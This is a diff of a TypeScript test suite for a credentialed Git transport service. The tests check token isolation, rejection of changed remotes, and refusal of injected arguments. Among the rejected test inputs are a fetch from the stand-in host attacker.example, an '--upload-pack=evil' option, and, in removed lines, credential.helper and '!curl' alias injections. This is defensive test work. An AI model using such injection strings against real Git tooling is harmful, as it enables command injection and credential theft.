@@ -14,19 +14,22 @@ class RecordingRunner implements GitTransportCommandRunner {
     return this.result;
   }
 }
+const repositoryPath = "/workspace/repository";
+const topology = { kind: "single-repository" as const, repository: { owner: "acme", name: "repository", remote: { name: "origin", url: "https://github.com/acme/repository.git" }, defaultBranch: "main" } };
+function transport(runner: GitTransportCommandRunner) { return new GitTransportService({ resolve: async () => ({ profileName: "p", commonDirectory: "/workspace/.git", profileFingerprint: "0".repeat(64), actorLogin: "actor", topology }) }, { remoteUrl: async () => topology.repository.remote.url, commonDirectory: async () => "/workspace/.git" }, runner); }
 
 test("authenticated Git disables inherited credential helpers and keeps the token out of argv", async () => {
   const runner = new RecordingRunner();
-  const transport = new GitTransportService(runner);
+  const service = transport(runner);
   const token = "github_pat_secret_transport_token";
 
-  const result = await transport.run("/workspace/repository", ["fetch", "origin", "main"], { token });
+  const result = await service.run(repositoryPath, "fetch", "main", { token });
 
   assert.equal(result.stdout, "fetched");
   assert.equal(runner.commands.length, 1);
   const [command] = runner.commands;
   assert.deepEqual(command.argv, ["-C", "/workspace/repository", "fetch", "origin", "main"]);
-  assert.deepEqual(command.isolatedRemote, { repositoryPath: "/workspace/repository", remote: "origin" });
+  assert.deepEqual(command.isolatedRemote, { repositoryPath: "/workspace/repository", remote: "origin", expectedUrl: "https://github.com/acme/repository.git" });
   assert.equal(command.env.GIT_CONFIG_COUNT, "2");
   assert.equal(command.env.GIT_CONFIG_KEY_0, "http.https://github.com/.extraheader");
   assert.equal(command.env.GIT_CONFIG_VALUE_0, "");
@@ -39,16 +42,16 @@ test("authenticated Git disables inherited credential helpers and keeps the toke
 
 test("the command contract does not invoke or mutate global gh state", async () => {
   const runner = new RecordingRunner();
-  const transport = new GitTransportService(runner);
-  await transport.run("/workspace/repository", ["ls-remote", "origin"], { token: "token" });
+  const service = transport(runner);
+  await service.run(repositoryPath, "ls-remote", undefined, { token: "token" });
   assert.deepEqual(runner.commands.map((command) => command.executable), ["/usr/bin/git"]);
 });
 
 test("transport refuses a token-bearing remote before the runner can observe it", async () => {
   const runner = new RecordingRunner();
-  const transport = new GitTransportService(runner);
+  const service = transport(runner);
   await assert.rejects(
-    transport.run("/workspace/repository", ["fetch", "https://x-access-token:token@github.com/acme/repository.git"], { token: "token" }),
+    service.run(repositoryPath, "fetch", "https://x-access-token:token@github.com/acme/repository.git", { token: "token" }),
     /refuses credentials/i,
   );
   assert.equal(runner.commands.length, 0);
@@ -56,17 +59,27 @@ test("transport refuses a token-bearing remote before the runner can observe it"
 
 test("transport rejects option, config, helper, and exfiltration injection before the runner", async () => {
   const runner = new RecordingRunner();
-  const transport = new GitTransportService(runner);
-  for (const args of [
-    ["fetch", "origin", "--upload-pack=evil"],
-    ["-c", "credential.helper=evil", "fetch"],
-    ["config", "--global", "alias.fetch=!curl"],
-    ["fetch", "https://attacker.example/repository.git"],
-    ["push", "origin", "main"],
-  ]) {
-    await assert.rejects(transport.run("/workspace/repository", args, { token: "token" }), /refuses|only permits/i);
+  const service = transport(runner);
+  for (const ref of ["--upload-pack=evil", "https://attacker.example/repository.git", "config"]) {
+    await assert.rejects(service.run(repositoryPath, "fetch", ref, { token: "token" }), /refuses|unsafe/i);
   }
   assert.equal(runner.commands.length, 0);
+});
+
+test("bound transport rejects changed, normalized, and destination remotes before the runner", async () => {
+  for (const url of ["https://github.com/acme/destination.git", "https://github.com/acme/repository", "https://github.com/ACME/repository.git"]) {
+    const runner = new RecordingRunner();
+    const service = new GitTransportService({ resolve: async () => ({ profileName: "p", commonDirectory: "/workspace/.git", profileFingerprint: "0".repeat(64), actorLogin: "actor", topology }) }, { remoteUrl: async () => url, commonDirectory: async () => "/workspace/.git" }, runner);
+    await assert.rejects(service.run(repositoryPath, "fetch", "main", { token: "secret" }), /remote/i);
+    assert.equal(runner.commands.length, 0);
+  }
+});
+
+test("bound resolver drift rejects before remote lookup, runner, or token exposure", async () => {
+  const runner = new RecordingRunner(); let remoteReads = 0;
+  const service = new GitTransportService({ resolve: async () => { throw new Error("binding/profile/topology drift"); } }, { remoteUrl: async () => { remoteReads += 1; return topology.repository.remote.url; }, commonDirectory: async () => "/workspace/.git" }, runner);
+  await assert.rejects(service.run(repositoryPath, "fetch", "main", { token: "secret-token" }), /drift/);
+  assert.equal(remoteReads, 0); assert.equal(runner.commands.length, 0);
 });
 
 test("production Git runner is PATH-independent and an explicitly injected executable receives only sanitized environment", async () => {
@@ -140,7 +153,7 @@ test("authenticated runner isolates a named remote from hostile Git config and d
     const result = await runner.run({
       executable, argv: ["-C", "/repository", "fetch", "origin", "main"],
       env: { GIT_CONFIG_COUNT: "2", GIT_CONFIG_KEY_0: "http.https://github.com/.extraheader", GIT_CONFIG_VALUE_0: "", GIT_CONFIG_KEY_1: "http.https://github.com/.extraheader", GIT_CONFIG_VALUE_1: "AUTHORIZATION: bearer ephemeral-token" },
-      isolatedRemote: { repositoryPath: "/repository", remote: "origin" },
+      isolatedRemote: { repositoryPath: "/repository", remote: "origin", expectedUrl: "https://github.com/acme/widget.git" },
     });
     assert.equal(result.exitCode, 0);
     assert.match(result.stdout, /url = https:\/\/github\.com\/acme\/widget\.git/);
@@ -152,4 +165,16 @@ test("authenticated runner isolates a named remote from hostile Git config and d
     for (const [key, value] of Object.entries(inherited)) value === undefined ? delete process.env[key] : process.env[key] = value;
     await rm(directory, { recursive: true, force: true });
   }
+});
+
+test("runner rejects a remote changed after authority validation before the credentialed child", async () => {
+  const directory = await mkdtemp(join(tmpdir(), "shipyard-remote-race-"));
+  const executable = join(directory, "trusted-git");
+  try {
+    await writeFile(executable, "#!/bin/sh\nif [ \"$3\" = config ]; then printf '%s\\n' 'https://github.com/acme/destination.git'; exit 0; fi\nprintf 'NETWORK %s' \"$GIT_CONFIG_VALUE_1\"\n", { mode: 0o700 });
+    await chmod(executable, 0o700);
+    const result = await createNodeGitTransportCommandRunner(executable).run({ executable, argv: ["-C", "/repository", "fetch", "origin"], env: { GIT_CONFIG_VALUE_1: "AUTHORIZATION: bearer secret-token" }, isolatedRemote: { repositoryPath: "/repository", remote: "origin", expectedUrl: "https://github.com/acme/widget.git" } });
+    assert.notEqual(result.exitCode, 0); assert.match(result.stderr, /changed after authority/i);
+    assert.equal(result.stdout.includes("NETWORK"), false); assert.equal(`${result.stdout}\n${result.stderr}`.includes("secret-token"), false);
+  } finally { await rm(directory, { recursive: true, force: true }); }
 });
